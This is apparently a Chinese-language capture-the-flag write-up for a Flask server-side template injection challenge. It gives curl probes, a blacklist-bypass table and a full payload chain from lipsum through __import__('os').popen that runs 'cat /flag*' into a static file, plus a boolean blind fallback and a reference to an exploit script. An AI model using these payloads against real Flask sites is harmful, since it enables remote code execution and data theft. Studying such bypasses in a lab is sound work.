# WEB-01（初赛 WEB-01 · Web · 200 分）

「Age Test」Flask SSTI 盲注题（无附件，纯实例）。POST `/` 的 `nickname` 拼进
`render_template_string`，黑名单禁 `{{}}`/`[`/`]`/`.`/`_`/`'`/`+`/空格/字母 `x`/`g`
及 30 余关键词。三件套绕过 + 写文件回读拿 flag。**与 HardFlask-awdp-fix 同原型**
（那是本题的决赛加固版，黑名单更狠，链条同构——两题互相参考）。

> flag_policy=dynamic：打实例取新值。初赛值 `16063092785889954752794598715573`
> 只作形态参考（32 位十进制数）。

## 快速路径（5 分钟）

1. 指纹确认（预期 `Server: Werkzeug/2.0.3 Python/3.8.20`，页面 Age Test，响应
   `Are you 18 years old, test?`）：

   ```bash
   curl -s -D- http://$TARGET/ -d 'nickname=test' | head -5
   ```

2. 确认 SSTI oracle（`{%if(1)%}` 输出注入文本、`{%if(0)%}` 不输出）：

   ```bash
   curl -s http://$TARGET/ -d 'nickname={%if(1)%}PWNED{%endif%}'   # 含 PWNED
   ```

3. RCE 写文件回读（**不要走 OOB——决赛环境无公网**；静态目录 0777 可写）：

   ```bash
   # payload 构造见 exp/solve.py（全量 \uXXXX 转义，等价于：
   # lipsum|attr("__globals__")|attr("__getitem__")("__builtins__")
   #   |attr("__getitem__")("__import__")("os")|attr("popen")
   #   ("cat /flag*>/app/static/kbout")）
   python3 /opt/solver/knowledges/xihulunjian/challenges/WEB-01/exp/solve.py $TARGET
   ```

   预期输出：脚本自动提交 payload、轮询 `GET /static/kbout` 并打印读到的 flag。

4. 提交读到的值（裸值）。

## 绕过原理（备查）

| 防御 | 绕过 |
|---|---|
| 禁 `{{ }}` + 关键词 `print` | `{%if(...)%}...{%endif%}` 语句块 |
| 禁 `_` `.` `[` `]` `'` `+` 空格、`x`/`g`、关键词 | 字符串全部 `\uXXXX` 转义（WAF 查文本，Jinja 解析转义后的语义） |
| 禁 `request`/`config`/`subclasses` 入口 | 全局 `lipsum` → `__globals__` → `__builtins__` → `__import__` |
| 无回显 | `popen` 写 `/app/static/<name>` 后 GET 回读 |

## 失败分支

- 写 `/app/static/` 失败（目录不可写）：退回 `startswith` 布尔盲注逐字符猜
  （`{%if(lipsum|attr(...)("cat /flag").read()|attr("startswith")("\u0044"))%}` 形态，
  每字符 ≤16 次请求二分；32 字符约 500 请求内完成）。
- 黑名单比初赛更狠（决赛加固，见 HardFlask-awdp-fix）：改用该条目记录的加固版绕法
  （备用 class 链 subclasses 索引需 0..400 探针扫描）。
- `$((` 算术展开坑：命令里 `$(` 与 `(` 之间必须有空格。

## 决赛实测备忘

- 初赛 12 名解出；本题在决赛测试赛未出现（同名原型以 HardFlask-awdp-fix 加固版出现）。
- 初赛提交实证：`DASCTF{...}` 整串被拒、裸值 32 位数字被接受。
- 2026-09-12 实跑验证：exp 对按本条目规格本地复刻的靶机（Age Test 页面 + 记录在案
  的黑名单语义——`{{}}`/`[]`/`.`/`_`/`'`/`+`/空格/字母 x,g/关键词，双引号可用——
  `/flag` + 可写 `/app/static`）端到端打通：oracle 探活 → `\uXXXX` 全量转义 payload
  过滤零命中 → 写 `/app/static/kbout` → GET 回读与植入 flag 逐字节一致 → 自动清理
  exfil 文件。真靶机已下线，链路正确性以复刻实证；决赛打真靶机取新值。
